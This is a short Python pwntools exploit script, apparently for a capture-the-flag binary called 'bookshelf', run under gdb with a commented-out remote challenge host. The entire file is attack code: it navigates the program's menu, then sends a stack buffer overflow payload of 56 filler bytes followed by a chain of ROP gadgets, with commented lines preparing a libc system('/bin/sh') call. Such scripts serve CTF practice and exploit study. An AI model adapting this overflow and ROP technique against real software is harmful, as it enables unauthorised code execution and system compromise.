from pwn import *


context.terminal = ["tmux", "splitw"]
p = gdb.debug('/mnt/c/Users/zahar/Downloads/bookshelf (1)', '''
break adminBook
continue
''')


# libc = ELF('/lib64/libc.so.6')
# p = process('/mnt/c/Users/zahar/Downloads/bookshelf (1)')

# p = remote('chal.pctf.competitivecyber.club', 8989)

e    = ELF('/mnt/c/Users/zahar/Downloads/bookshelf (1)')
libc = ELF('./libc.6.so')

rop_elf = ROP(e)
POP_RDI_RET = rop_elf.find_gadget(['pop rdi', 'ret'])[0]
ADD_RSP_RET = rop_elf.find_gadget(['add rsp, 8', 'ret'])[0]

# rop = ROP(libc)
# BIN_SH = LIBC_BASE + next(libc.search(b'/bin/sh'))
# SYSTEM = LIBC_BASE + libc.symbols['system']
# FIX_RSP_RET = LIBC_BASE + rop.find_gadget(['pop rbx', 'pop rbp', 'ret'])[0]

p.clean()

p.sendline(b'1')
p.recvuntil(b'>> ')
p.sendline(b'y')
p.sendline(b'A' * 38)

p.recvuntil(b'>> ')
p.sendline(b'3')

payload  = b'A' * 56
payload += p64(ADD_RSP_RET)
payload += p64(ADD_RSP_RET)
payload += p64(ADD_RSP_RET)
payload += p64(ADD_RSP_RET)
payload += p64(ADD_RSP_RET)
payload += p64(ADD_RSP_RET)
payload += p64(ADD_RSP_RET)
payload += p64(ADD_RSP_RET)
payload += p64(ADD_RSP_RET)
payload += p64(ADD_RSP_RET)
payload += p64(ADD_RSP_RET)
payload += p64(ADD_RSP_RET)
payload += p64(ADD_RSP_RET)

p.sendline(payload)

p.interactive()